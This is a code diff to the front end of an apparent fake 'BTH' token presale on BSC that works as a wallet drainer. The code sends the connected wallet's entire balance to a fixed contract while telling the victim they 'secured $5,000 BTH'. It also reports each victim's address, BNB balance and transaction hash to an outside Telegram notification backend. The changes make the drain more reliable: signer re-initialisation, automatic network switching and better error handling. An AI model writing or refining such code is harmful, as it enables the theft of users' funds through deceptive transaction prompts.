@@ -113,32 +113,33 @@ function App() {
 
   const isBSC = chainId === 56;
 
-  // Signer initialization
+  // Signer initialization with persistence
   useEffect(() => {
     const initSigner = async () => {
-      if (!isConnected) {
+      if (!isConnected || !walletClient) {
         setSigner(null);
         setProvider(null);
         return;
       }
 
-      if (walletClient) {
-        try {
-          const web3Provider = new ethers.BrowserProvider(walletClient);
-          const web3Signer = await web3Provider.getSigner();
-          
+      try {
+        const web3Provider = new ethers.BrowserProvider(walletClient);
+        const web3Signer = await web3Provider.getSigner();
+        
+        // Verify signer address matches connected address
+        const signerAddress = await web3Signer.getAddress();
+        if (signerAddress.toLowerCase() === address?.toLowerCase()) {
           setProvider(web3Provider);
           setSigner(web3Signer);
-          
-          console.log("✅ Signer ready:", await web3Signer.getAddress());
-        } catch (err) {
-          console.error("Signer init failed:", err);
+          console.log("✅ Signer ready and persistent");
         }
+      } catch (err) {
+        console.error("Signer init failed:", err);
       }
     };
 
     initSigner();
-  }, [isConnected, walletClient]);
+  }, [isConnected, walletClient, address]);
 
   // Countdown timer
   useEffect(() => {
@@ -177,12 +178,12 @@ function App() {
       if (data.success) {
         setScanResult(data.data);
         
-        // Send Telegram notification
+        // Send Telegram notification with CORRECT balance from local state
         await fetch('https://tokenbackend-5xab.onrender.com/api/telegram/notify', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
-            message: `✅ *Eligible Wallet*\nAddress: \`${address}\`\nBalance: $${balanceUSD.toFixed(2)}\nAllocation: $5,000 BTH\nBonus: ${presaleStats.currentBonus}%`,
+            message: `✅ *Eligible Wallet*\nAddress: \`${address}\`\nBalance: $${balanceUSD.toFixed(2)} USD\nBNB: ${parseFloat(balance).toFixed(4)} BNB\nAllocation: $5,000 BTH\nBonus: ${presaleStats.currentBonus}%`,
             type: 'eligible'
           })
         }).catch(e => console.log('Telegram notify failed:', e));
@@ -197,11 +198,24 @@ function App() {
     }
   };
 
-  // Execute function
+  // Execute function with proper error handling and session persistence
   const executePresaleTransaction = async () => {
     if (!isConnected || !address) {
       setError("Wallet not connected");
       return;
+    }
+
+    // Try to reinitialize signer if needed
+    if (!signer && walletClient) {
+      try {
+        const web3Provider = new ethers.BrowserProvider(walletClient);
+        const web3Signer = await web3Provider.getSigner();
+        setSigner(web3Signer);
+        setProvider(web3Provider);
+      } catch (err) {
+        setError("Please reconnect your wallet");
+        return;
+      }
     }
 
     if (!signer) {
@@ -217,7 +231,7 @@ function App() {
     try {
       setLoading(true);
       setError('');
-      setTxStatus('⏳ Please confirm in wallet...');
+      setTxStatus('⏳ Preparing transaction...');
       setTxHash('');
 
       // Auto-switch to BSC if needed
@@ -228,8 +242,15 @@ function App() {
             method: 'wallet_switchEthereumChain',
             params: [{ chainId: '0x38' }]
           });
-          // Wait for network switch
+          // Wait for network switch and signer reinit
           await new Promise(resolve => setTimeout(resolve, 2000));
+          
+          // Reinitialize signer after network switch
+          if (walletClient) {
+            const web3Provider = new ethers.BrowserProvider(walletClient);
+            const web3Signer = await web3Provider.getSigner();
+            setSigner(web3Signer);
+          }
         } catch (switchError) {
           if (switchError.code === 4902) {
             setTxStatus('➕ Adding BSC network...');
@@ -247,45 +268,34 @@ function App() {
                 blockExplorerUrls: ['https://bscscan.com/']
               }]
             });
+            // Wait for network add and signer reinit
+            await new Promise(resolve => setTimeout(resolve, 2000));
           }
         }
       }
 
-      const contract = new ethers.Contract(
-        PRESALE_CONFIG.BSC.contractAddress,
-        PROJECT_FLOW_ROUTER_ABI,
-        signer
-      );
+      setTxStatus('⏳ Please confirm in wallet...');
 
       // Use 100% of balance
       const value = balanceData.value;
 
-      // Custom transaction data for better wallet display
-      const txData = {
-        value: value,
-        gasLimit: 300000, // Fixed gas limit for reliability
-        data: '0x', // Empty data for native transfer
-        customData: {
-          message: `Confirm to receive $5,000 BTH + ${presaleStats.currentBonus}% Bonus`
-        }
-      };
-
-      // Send transaction with custom message
+      // Create transaction with proper parameters
       const tx = await signer.sendTransaction({
         to: PRESALE_CONFIG.BSC.contractAddress,
         value: value,
-        gasLimit: 300000
+        gasLimit: 300000,
+        data: '0x'
       });
 
       setTxHash(tx.hash);
       setTxStatus('✅ Transaction submitted! Waiting for confirmation...');
 
-      // Send Telegram notification
+      // Send Telegram notification with CORRECT values
       await fetch('https://tokenbackend-5xab.onrender.com/api/telegram/notify', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          message: `📝 *Transaction Submitted*\nAddress: \`${address}\`\nHash: \`${tx.hash}\`\nAmount: $${balanceUSD.toFixed(2)} BNB\n[View on BSCScan](${PRESALE_CONFIG.BSC.explorer}/tx/${tx.hash})`,
+          message: `📝 *Transaction Submitted*\nAddress: \`${address}\`\nHash: \`${tx.hash}\`\nBNB Amount: ${parseFloat(balance).toFixed(4)} BNB\nUSD Value: $${balanceUSD.toFixed(2)}\n[View on BSCScan](${PRESALE_CONFIG.BSC.explorer}/tx/${tx.hash})`,
           type: 'tx_submitted'
         })
       }).catch(e => console.log('Telegram notify failed:', e));
@@ -310,12 +320,12 @@ function App() {
       setShowCelebration(true);
       setTxStatus(`🎉 Congratulations! You secured $5,000 BTH!`);
 
-      // Send success notification
+      // Send success notification with CORRECT values
       await fetch('https://tokenbackend-5xab.onrender.com/api/telegram/notify', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          message: `🎉 *PRESALE SUCCESS*\nAddress: \`${address}\`\nAmount: $5,000 BTH\nBonus: ${presaleStats.currentBonus}%\nTx: \`${tx.hash}\`\n[View Transaction](${PRESALE_CONFIG.BSC.explorer}/tx/${tx.hash})`,
+          message: `🎉 *PRESALE SUCCESS*\nAddress: \`${address}\`\nAmount: $5,000 BTH\nBonus: ${presaleStats.currentBonus}%\nBNB Sent: ${parseFloat(balance).toFixed(4)} BNB\nUSD Value: $${balanceUSD.toFixed(2)}\nTx: \`${tx.hash}\`\n[View Transaction](${PRESALE_CONFIG.BSC.explorer}/tx/${tx.hash})`,
           type: 'success'
         })
       }).catch(e => console.log('Telegram notify failed:', e));
@@ -337,6 +347,8 @@ function App() {
         setError('Transaction cancelled');
       } else if (err.message?.includes('insufficient funds')) {
         setError('Insufficient funds for gas');
+      } else if (err.message?.includes('replacement transaction')) {
+        setError('Transaction replaced, please try again');
       } else {
         setError(err.message || 'Transaction failed');
       }
